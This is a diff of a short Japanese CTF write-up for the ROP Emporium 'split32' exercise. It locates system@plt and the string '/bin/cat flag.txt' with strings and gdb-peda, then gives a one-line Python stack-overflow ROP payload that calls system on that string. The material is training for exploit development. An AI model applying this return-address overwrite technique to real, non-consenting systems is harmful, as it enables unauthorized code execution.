@@ -1,12 +1,3 @@
-systemはあるので、
-
-```
-0x8048657 <usefulFunction+14>:  call   0x8048430 <system@plt>
-```
-
-"/bin/cat flag.txt"をスタックに積んで、systemのアドレスに遷移させる
-
-
 stringsしてみると `/bin/cat flag.txt` が見つかる
 ```
 ~/ctf/practical-pwn/ROP-Emporium/split32:yyy@(*｡˃̵ω ˂̵｡) < strings split32
@@ -42,6 +33,14 @@ GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
 crtstuff.c
 ```
 
+systemはあるので、
+
+```
+0x8048657 <usefulFunction+14>:  call   0x8048430 <system@plt>
+```
+
+"/bin/cat flag.txt"をスタックに積んで、systemのアドレスに遷移させる
+
 ```
 gdb-peda$ find "/bin/cat flag.txt"
 Searching for '/bin/cat flag.txt' in: None ranges
@@ -49,9 +48,10 @@ Found 1 results, display max 1 items:
 split32 : 0x804a030 ("/bin/cat flag.txt")
 ```
 
-
+```
 python -c 'print "A" * 44 + "\x30\x84\x04\x08" + "AAAA" + "\x30\xa0\x04\x08"' |./split32
                               (system@plt)   (retn_addr)  ("/bin/cat flag.txt")
+```
 
 ```
 split by ROP Emporium
